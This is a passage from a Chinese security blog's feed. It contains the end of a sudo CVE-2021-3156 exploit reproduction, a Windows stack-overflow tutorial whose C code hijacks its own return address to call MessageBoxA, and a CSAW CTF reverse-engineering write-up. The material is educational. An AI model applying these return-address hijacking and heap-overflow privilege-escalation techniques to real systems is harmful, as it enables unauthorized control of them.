span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>要覆盖的name成员在0x30的偏移位置</li></ol><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011160159.png" alt="pwndbg 调试"></p><ol start="2"><li>Exp中addChunk()函数 </li></ol><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011160246.png" alt="addChunk"></p><p>循环赋值a的时候，i=9是因为前面已经有了9个字符。</p><p>为什么在循环的地方会减去一个<code>0x17</code>？</p><p>经过对比更改数值过后，在<code>setlocale</code>函数运行完毕之后的堆空间分布。</p><p>我的理解是这样的，他为了确保<code>0xa0</code>的堆空间 与 最后一个<code>0x40</code> 的堆空间之间的距离刚好是0x650。如果硬要减去一个不同的值，<code>0xa0</code> 与 <code>0x40</code> 之间堆空间的距离会被拉大。当然这其中还要考虑到堆空间是16字节对齐的问题。那么这个时候，<code>0xa0</code> 与 <code>0x40</code> 堆空间的距离有可能会发生变化。据我调试观察发现，这个距离有可能是<code>0x650\0x660\0x670</code></p><p>至于这个距离为什么会变化，还要看<code>setlocale.c</code>中的<code>_nl_find_locale</code>函数位于<code>glibc/locale/findlocale.c</code>。以及<code>_nl_make_l0nflist</code>函数—位于<code>glibc/intl/l0nflist.c</code>。这些函数中会对堆空间继续进行处理。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011160505.png" alt="-0x17"></p><ol start="3"><li>Exp中的finally()函数</li></ol><p>之所以在构造环境变量的过程中我们多使用了一个<code>LC_NAME==xxxxxxxxxxxxxxxxxxxxx</code>。就是因为这里释放的时候，他先将category++。所以就造成了，只有多出来一个。<code>++category</code>之后才能刚好移动到我们想要释放的大小空间上。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011160753.png" alt="glibc/locale/setlocale.c"></p><ol start="4"><li>为什么认为nsswitch.c中__getline分配的堆空间为0x80</li></ol><p>通过阅读源码可以发现，在调用的过程中，如果<code>size_t *n</code> 为0的话，会直接给一个<code>120(0x78)</code>，的大小，而一般堆空间都是要对齐的，32位和64的情况不同，分别是8字节和16字节对齐。再加上配置文件中一行的占用大小远远小于120，所以后续不会重新分配一个更大的空间，后续每一次调用这个__getline都会使用这个堆空间。综上，nsswitch.c中的__getline会申请一个0x80的堆空间大小。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011161002.png" alt="libio/iogetdelim.c/_IO_getdelim"></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><h4 id="docker环境"><a href="#docker环境" class="headerlink" title="docker环境"></a>docker环境</h4><ul><li><a href="https://hub.docker.com/r/chenaotian/cve-2021-3156">https://hub.docker.com/r/chenaotian/cve-2021-3156</a></li></ul><h4 id="主要参考"><a href="#主要参考" class="headerlink" title="主要参考"></a>主要参考</h4><ul><li><a href="https://blog.csdn.net/Breeze_CAT/article/details/122676551">https://blog.csdn.net/Breeze_CAT/article/details/122676551</a></li><li><a href="https://github.com/chenaotian/CVE-2021-3156">https://github.com/chenaotian/CVE-2021-3156</a></li><li><a href="https://github.dev/lattera/glibc/blob/master/nss/nsswitch.c">https://github.dev/lattera/glibc/blob/master/nss/nsswitch.c —-github按下<code>&gt;</code>可以启动网页版的vscode可以看glibc的源码</a></li></ul><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul><li><a href="https://www.cnblogs.com/panwenbin-logs/p/16050472.html">https://www.cnblogs.com/panwenbin-logs/p/16050472.html   —-NSS细节</a></li><li><a href="https://www.cnblogs.com/dylancao/p/10677660.html">https://www.cnblogs.com/dylancao/p/10677660.html —-strdup()</a></li><li><a href="https://www.xiexianbin.cn/linux/basic/linux-nssswitch/index.html">https://www.xiexianbin.cn/linux/basic/linux-nssswitch/index.html —-Linux nsswithch.conf 详解</a></li><li><a href="https://www.cnblogs.com/murkuo/p/15965270.html">https://www.cnblogs.com/murkuo/p/15965270.html —-pwndbg基本操作</a></li><li><a href="https://blog.csdn.net/zhang14916/article/details/108319252">https://blog.csdn.net/zhang14916/article/details/108319252 —-libc 2.27 堆管理机制</a></li><li><a href="https://kiprey.github.io/2021/01/CVE-2021-3156/#b-POC">https://kiprey.github.io/2021/01/CVE-2021-3156/#b-POC</a></li><li><a href="https://www.anquanke.com/post/id/231077#h2-4">https://www.anquanke.com/post/id/231077#h2-4</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞复现-栈溢出-堆溢出sudo提权&quot;&gt;&lt;a href=&quot;#漏洞复现-栈溢出-堆溢出sudo提权&quot; class=&quot;headerlink&quot; title=&quot;漏洞复现-栈溢出+堆溢出sudo提权&quot;&gt;&lt;/a&gt;漏洞复现-栈溢出+堆溢出sudo提权&lt;/h1&gt;&lt;h2 id=&quot;栈</summary>
      
    
    
    
    <category term="漏洞浮现" scheme="https://laobameishijia.github.io/category/%E6%BC%8F%E6%B4%9E%E6%B5%AE%E7%8E%B0/"/>
    
    
    <category term="栈溢出" scheme="https://laobameishijia.github.io/tag/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    <category term="堆溢出" scheme="https://laobameishijia.github.io/tag/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>CTF-PWN-平衡栈帧</title>
    <link href="https://laobameishijia.github.io/2022/09/17/ctf-zhan-ping-heng/"/>
    <id>https://laobameishijia.github.io/2022/09/17/ctf-zhan-ping-heng/</id>
    <published>2022-09-17T09:25:00.000Z</published>
    <updated>2022-10-23T06:50:14.676Z</updated>
    
    <content type="html"><![CDATA[<h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><h2 id="第一讲–初始"><a href="#第一讲–初始" class="headerlink" title="第一讲–初始"></a>第一讲–初始</h2><p><strong>先说明，以下讨论均在32位机器下进行讨论！</strong></p><p>这个栈溢出的例子,我是从b站up主Innks那里看到的。因为有些细节不理解，所以动手敲了一遍。</p><h3 id="改进之前"><a href="#改进之前" class="headerlink" title="改进之前"></a>改进之前</h3><p>改进之前由于没有平衡栈空间，导致栈空间被破坏，程序无法正确返回。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">optimize</span><span class="token punctuation">(</span></span><span class="token string">""</span><span class="token expression"><span class="token punctuation">,</span>off<span class="token punctuation">)</span></span></span><span class="token keyword">void</span> <span class="token function">MsgBox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> ary<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    ary<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> ary<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//相当于把ret返回地址复制了一遍</span>    ary<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>MessageBoxA<span class="token punctuation">;</span>    <span class="token comment">//ary[4] = ary[3]; //这条指令写到这个位置和写在上面一个位置是完全不一样的哟！</span>    ary<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ary<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"NO_CALL 恭喜你中毒了"</span><span class="token punctuation">;</span>    ary<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"NO_CALL 你中毒了"</span><span class="token punctuation">;</span>    ary<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> MB_OK<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">MsgBox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"恭喜你中毒了"</span><span class="token punctuation">,</span> <span class="token string">"你中毒了"</span><span class="token punctuation">,</span> MB_OK<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="改进之后"><a href="#改进之后" class="headerlink" title="改进之后"></a>改进之后</h3><p>改进之后，可以正确的让程序结束</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">optimize</span><span class="token punctuation">(</span></span><span class="token string">""</span><span class="token expression"><span class="token punctuation">,</span>off<span class="token punctuation">)</span></span></span><span class="token keyword">void</span> <span class="token function">MsgBox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> ary<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    ary<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> ary<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//相当于把ret返回地址复制了一遍</span>    ary<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>MessageBoxA<span class="token punctuation">;</span>    <span class="token comment">//ary[4] = ary[3]; //这条指令写到这个位置和写在上面一个位置是完全不一样的哟！</span>    ary<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ary<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"NO_CALL 恭喜你中毒了"</span><span class="token punctuation">;</span>    ary<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"NO_CALL 你中毒了"</span><span class="token punctuation">;</span>    ary<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> MB_OK<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    __asm push ebp<span class="token punctuation">;</span>    __asm push ebp<span class="token punctuation">;</span>    __asm push ebp<span class="token punctuation">;</span>    __asm push ebp<span class="token punctuation">;</span>    __asm push ebp<span class="token punctuation">;</span>    <span class="token function">MsgBox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"恭喜你中毒了"</span><span class="token punctuation">,</span> <span class="token string">"你中毒了"</span><span class="token punctuation">,</span> MB_OK<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="改进前后的栈帧对比"><a href="#改进前后的栈帧对比" class="headerlink" title="改进前后的栈帧对比"></a>改进前后的栈帧对比</h3><p>由于ipencil长时间不用，现在才发现已经被我摔坏了，以后不常用的东西还是保管好呢，不要满不在意，用的时候才发现坏了。</p><p>所以我就直接用手写的图了，懒得画图了。</p><p>也确实是该换手机了，手机前置摄像头找出来的照片有点黑。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220917164427.jpg" alt="栈空间对比"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>因为我们采用栈溢出的方式调用了函数，那么应该<code>push到栈中的参数占的空间</code>占用了<code>其他栈帧的空间</code>。所以会导致后续程序流发生不可控制的变化。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220917164601.png" alt="MessageBoxA的汇编代码"></p><p>汇编中的<code>retn 10h</code>就是为了平衡call函数之前push到栈里面的参数所占的空间。第一开始不理解的地方就在于此，我觉得<code>retn 10h</code>平衡的也就是<code>4个参数--16字节</code>。但是up主却用了五个<code>push ebp</code>。</p><p>实际上，<code>retn 10h</code>使栈空间减少了20个字节的空间。</p><blockquote><p>retn操作：先eip=esp，然后esp=esp+4<br>retn N操作：先eip=esp，然后esp=esp+4+N</p></blockquote><p>所以是20个字节！也就是五个<code>push ebp</code>就可以提前把这20个字节的空间弄出来。而不用影响到后续main函数的栈帧。</p><p>除此之外呢，我还发现vs—debug编译模式和release模式，是非常不一样的。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220917165306.png" alt="vs-debug&amp;release"></p><p>debug简单来说是为了方便分析程序，release模式是发布程序。我使用ida反汇编之后发现，debug生成的exe的汇编代码中添加了很多关于栈空间和一些寄存器的检查工作。而release模式下，是没有这些检查函数的。</p><h2 id="第二讲–改进"><a href="#第二讲–改进" class="headerlink" title="第二讲–改进"></a>第二讲–改进</h2><p>通过前面的第一讲，我们明白了要解决通过栈溢出调用函数而导致的栈平衡问题。</p><p>up 还留了一个坑。 就是要采用什么样的方式去平衡栈，而不用写汇编。</p><h3 id="预知识"><a href="#预知识" class="headerlink" title="预知识"></a>预知识</h3><p>函数调用有<code>__cdecl</code>、<code>__stdcall</code>。</p><p>__cdecl 是C Declaration的缩写（declaration，声明），表示C语言默认的函数调用方法：所有参数从右到左依次入栈，这些参数由调用者清除，称为手动清栈。被调用函数不会要求调用者传递多少参数，调用者传递过多或者过少的参数，甚至完全不同的参数都不会产生编译阶段的错误。</p><p>_stdcall 是StandardCall的缩写：所有参数从右到左依次入栈，如果是调用类成员的话，最后一个入栈的是this指针。这些堆栈中的参数由被调用的函数在返回后清除，使用的指令是 retnX，X表示参数占用的字节数，CPU在ret之后自动弹出X个字节的堆栈空间。称为自动清栈。函数在编译的时候就必须确定参数个数，并且调用者必须严格的控制参数的生成，不能多，不能少，否则返回后会出错。</p><p>MessageBoxA显然属于_stdcall。由被调用函数自己清栈。这也是系统API的特点之一。这样做的好处就是，严格控制了传递参数的个数，或多或少都不行。<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220919153649.png" alt="MessageBoxA"></p><p>MsgBox 属于_cdecl调用方式，由调用者自己清栈，这个过程中你传递参数的个数可以变化，这也是为什么可以定义可变参数的原因把。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220919154006.png" alt="MsgBox"></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>通过预知识的学习，我们知道了自定义函数和系统API调用采用的平栈方式不同，那么我们能不能利用这个特性来实现平栈呢？</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220919154545.png" alt="改进思路"></p><p>通过上图可以发现，我们通过给自定义函数增加参数，实现的效果和<code>push ebp</code>的效果一致。但是仅仅是这样不能够平栈，因为系统调用的时候还是会<code>retn 10h</code>，而由于_cdecl平栈的特性，其还<code>add esp 14h</code>。所以也就相当于进行了两次平栈操作。</p><p>那么 评论区大lao 的思路就是跳过 <code>add esp 14h</code>。由于这句指令是 3 字节，所以我们要在 <code>ary[4] = ary[3] + 3</code>。这样就跳到了下一条指令<code>push 0</code>的地址。</p><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">void MsgBox(int a, int b, int c, int d, int e)&#123;    int ary[2];    ary[4] &#x3D; ary[3] + 3 ; &#x2F;&#x2F;跳过 esp    ary[3] &#x3D; (int)MessageBoxA;    ary[5] &#x3D; 0;    ary[6] &#x3D; (int)&quot;NO_CALL 恭喜你中毒了&quot;;    ary[7] &#x3D; (int)&quot;NO_CALL 你中毒了&quot;;    ary[8] &#x3D; MB_OK;&#125;int main()&#123;    MsgBox(1,2,3,4,5);    MessageBoxA(0, &quot;恭喜你中毒了&quot;, &quot;你中毒了&quot;, MB_OK);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后up又对这个思路进行了改进。既然我们传递了一些参数，而且后续我们又把这些参数当作了MessageBoxA这个函数的参数，那么为什么不在传递参数的时候就把该传递的参数传进去呢。</p><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">void MsgBox(void* address,HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType)&#123;    int ary[2];    &#x2F;&#x2F;交换ary[3] 和ary [4] ----也就是把MessageBoxA的地址换上来，把返回地址换下去    ary[4] &#x3D; ary[3] ^ ary[4];    ary[3] &#x3D; ary[3] ^ ary[4];    ary[4] &#x3D; ary[3] ^ ary[4];    ary[4] &#x3D; ary[4] + 3;&#125;int main()&#123;    MsgBox(MessageBoxA,0, &quot;恭喜你中毒了&quot;, &quot;你中毒了&quot;, MB_OK);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="第三讲–完美"><a href="#第三讲–完美" class="headerlink" title="第三讲–完美"></a>第三讲–完美</h2><p>通过上述方式，我们知道了是需要跳过<code>_cdecl</code>或者是<code>_stdcall</code>两种平栈方式中的一种。那我们就可以利用这个欺骗编译器。</p><p>在声明的时候不给函数参数，但是在调用的时候，欺骗编译器这是个<code>_stdcall</code>类型且带有4个参数的函数，那么编译器会帮助我们将参数压栈，并且消除了<code>add esp 14h</code>的影响。</p><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">&#x2F;&#x2F;完美版本void MsgBox() &#123;    int ary[2];    &#x2F;&#x2F;交换ary[3] 和ary [4] ----也就是把MessageBoxA的地址换上来，把返回地址换下去    ary[3] &#x3D; ary[3] ^ ary[4];    ary[4] &#x3D; ary[3] ^ ary[4];    ary[3] &#x3D; ary[3] ^ ary[4];&#125;&#x2F;&#x2F;ret----_cdecl 方式返回typedef int* (_stdcall* _hMessageBoxA)(void* address, HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);&#x2F;&#x2F;这样做的好处是，代码可复用性强。后续只需要写写声明就可以了。typedef int* (_stdcall* _hMessageBoxW)(void* address, HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);int main()W&#123;    &#x2F;&#x2F;完美版本    ((_hMessageBoxA)MsgBox) (MessageBoxA, 0, &quot;恭喜你中毒了&quot;, &quot;你中毒了&quot;, MB_OK);    ((_hMessageBoxA)MsgBox) (MessageBoxA, 0, &quot;恭喜你中毒了&quot;, &quot;你中毒了&quot;, MB_OK);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="所有的代码"><a href="#所有的代码" class="headerlink" title="所有的代码"></a>所有的代码</h2><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">#include &lt;iostream&gt;#include &lt;Windows.h&gt;#pragma optimize(&quot;&quot;,off)&#x2F;&#x2F; 初始版本void MsgBox1(int a, int b, int c, int d, int e)&#123;    int ary[2];    ary[4] &#x3D; ary[3]; &#x2F;&#x2F;相当于把ret返回地址复制了一遍    ary[3] &#x3D; (int)MessageBoxA;    &#x2F;&#x2F;ary[4] &#x3D; ary[3]; &#x2F;&#x2F;这条指令写到这个位置和写在上面一个位置是完全不一样的哟！    ary[5] &#x3D; 0;    ary[6] &#x3D; (int)&quot;NO_CALL 恭喜你中毒了&quot;;    ary[7] &#x3D; (int)&quot;NO_CALL 你中毒了&quot;;    ary[8] &#x3D; MB_OK;&#125;&#x2F;&#x2F;进阶版本void MsgBox2(int a, int b, int c, int d, int e)&#123;    int ary[2];    ary[4] &#x3D; ary[3] + 3; &#x2F;&#x2F;跳过 esp    ary[3] &#x3D; (int)MessageBoxA;    &#x2F;&#x2F;ary[4] &#x3D; ary[3]; &#x2F;&#x2F;这条指令写到这个位置和写在上面一个位置是完全不一样的哟！    ary[5] &#x3D; 0;    ary[6] &#x3D; (int)&quot;NO_CALL 恭喜你中毒了&quot;;    ary[7] &#x3D; (int)&quot;NO_CALL 你中毒了&quot;;    ary[8] &#x3D; MB_OK;&#125;&#x2F;&#x2F;进阶版本---改进void MsgBox2_1(void* address, HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)&#123;    int ary[2];    &#x2F;&#x2F;交换ary[3] 和ary [4] ----也就是把MessageBoxA的地址换上来，把返回地址换下去    ary[4] &#x3D; ary[3] ^ ary[4];    ary[3] &#x3D; ary[3] ^ ary[4];    ary[4] &#x3D; ary[3] ^ ary[4];    ary[4] &#x3D; ary[4] + 3;&#125;&#x2F;&#x2F;完美版本void MsgBox() &#123;    int ary[2];    &#x2F;&#x2F;交换ary[3] 和ary [4] ----也就是把MessageBoxA的地址换上来，把返回地址换下去    ary[3] &#x3D; ary[3] ^ ary[4];    ary[4] &#x3D; ary[3] ^ ary[4];    ary[3] &#x3D; ary[3] ^ ary[4];&#125;&#x2F;&#x2F;ret----_cdecl 方式返回typedef int* (_stdcall* _hMessageBoxA)(void* address, HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);int main()&#123;    &#x2F;&#x2F;完美版本    ((_hMessageBoxA)MsgBox) (MessageBoxA, 0, &quot;恭喜你中毒了&quot;, &quot;你中毒了&quot;, MB_OK);    ((_hMessageBoxA) MsgBox) (MessageBoxA, 0, &quot;恭喜你中毒了&quot;, &quot;你中毒了&quot;, MB_OK);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>不知道怎么说，自己的水平还是差了很多，up主所提到的安全思维也没有。很有可能做一辈子也是个普通人，但那又能怎么样呢? 一直学下去呗。不断丰富自己，最后不会太差哒！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;栈溢出&quot;&gt;&lt;a href=&quot;#栈溢出&quot; class=&quot;headerlink&quot; title=&quot;栈溢出&quot;&gt;&lt;/a&gt;栈溢出&lt;/h1&gt;&lt;h2 id=&quot;第一讲–初始&quot;&gt;&lt;a href=&quot;#第一讲–初始&quot; class=&quot;headerlink&quot; title=&quot;第一讲–初始&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="CTF" scheme="https://laobameishijia.github.io/category/CTF/"/>
    
    
    <category term="PWN" scheme="https://laobameishijia.github.io/tag/PWN/"/>
    
  </entry>
  
  <entry>
    <title>CSAW-CTF--Write-Rev</title>
    <link href="https://laobameishijia.github.io/2022/09/10/csaw-ctf-rev/"/>
    <id>https://laobameishijia.github.io/2022/09/10/csaw-ctf-rev/</id>
    <published>2022-09-10T09:25:00.000Z</published>
    <updated>2022-10-23T06:50:14.676Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h1><h2 id="DockREleakage"><a href="#DockREleakage" class="headerlink" title="DockREleakage"></a>DockREleakage</h2><p>这个题目就比较简单，感觉不太像是逆向，有点像是溯源。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220910160143.png" alt="文件目录结构"></p><p>既然题目中说到了,隐私的数据要保管好。那么大概就是直接在文件中出现的。</p><p>打开acb…..这个文件之后，找到了flag的一部分，文件中说明了，剩下的flag要我们自己去找。所以呢，继续去找其他的文件。<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220910160356.png" alt="flag的一部分"></p><p>最终在另一个文件中找到了剩余的flag</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220910160527.png" alt="flag剩余的部分"></p><h2 id="Anya-Gacha"><a href="#Anya-Gacha" class="headerlink" title="Anya Gacha"></a>Anya Gacha</h2><h3 id="关键"><a href="#关键" class="headerlink" title="关键"></a>关键</h3><p>data = “wakuwaku” —&gt; byte类型 “77616b7577616b75”<br>sha256(byte(data)) —-&gt; 产生的是256bit的数据<br>注意，由于sha256产生的256bit的数据，所以接下来的编码方式就很重要。<br>如果你把这256bit的数据 转换为 16进制的字符串，那么应该是64个字符。<br>这个时候，如果你还想继续进行hash运算，你又要将<code>16进制字符串转为byte类型</code>。而此时转换为的<code>byte类型是512bit</code>，因为是要按照<code>utf-8</code>的编码方式进行。</p><h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><p>这个题目，提供了一个根据unity写的游戏。下载对应系统版本之后打开，我下载的是win版本的。</p><p>游戏页面中说明了，保证在1000内抽到这个人物。而这个人物会告诉你答案。有点类似于某些游戏的抽奖保底机制。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220910160725.png" alt="游戏页面"></p><p>根据网上的资料，要想逆向<code>unity</code>写的游戏，<code>dnsPy</code>这个工具不可或缺。下载完成之后，把包含程序主题逻辑的<code>Assembly-CSharp.dll</code>文件送入。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220910161029.png" alt="Assembly-CSharp.dll"></p><p>反汇编之后的代码都是明文的，C#语言读起来也非常友好。很容易我们就发现了关键函数。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220910161219.png" alt="wish函数"><br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220910161248.png" alt="upload函数"></p><p>阅读之后程序的主题逻辑也就清楚了</p><ul><li>每点击一次wish–抽奖，程序会把初始字符串<code>wakuwaku</code>进行一次hash运算</li><li>然后通过base64加密之后将其发往固定的服务器</li><li>判断服务器是否返回数据—经过测试，如果是不正确的hash，目标服务器不会返回任何数据。</li></ul><p>所以，我们就直接hash 1000次，然后base64加密之后，发给服务器就行。工具我用的是filder</p><pre class="line-numbers language-py" data-language="py"><code class="language-py">import hashlibimport base64data &#x3D; &quot;wakuwaku&quot;   # 要进行加密的数据data &#x3D; data.encode(&#39;utf-8&#39;)for x in range(0,1000):    data_sha &#x3D; hashlib.sha256(data).digest()    data &#x3D; data_shab64_byt &#x3D; base64.b64encode(data)print(b64_byt )<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><h3 id="关键-1"><a href="#关键-1" class="headerlink" title="关键"></a>关键</h3><p>这里qmemcpy函数的第二个参数表面上看上去只有4个字节，但实际上传递到该函数中的只是<code>指向第一个字符的指针</code>。\</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220911165015.png" alt="memcopy"></p><p>之所以在反汇编函数中仅仅出现cook这四个字母，是因为cook后面保存的是00。让编译器误认为其字符串结束了。以后在遇到的时候，就直接当指针处理。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220911165307.png" alt="20220911165307"></p><h3 id="解析-1"><a href="#解析-1" class="headerlink" title="解析"></a>解析</h3><p>本题提供了game 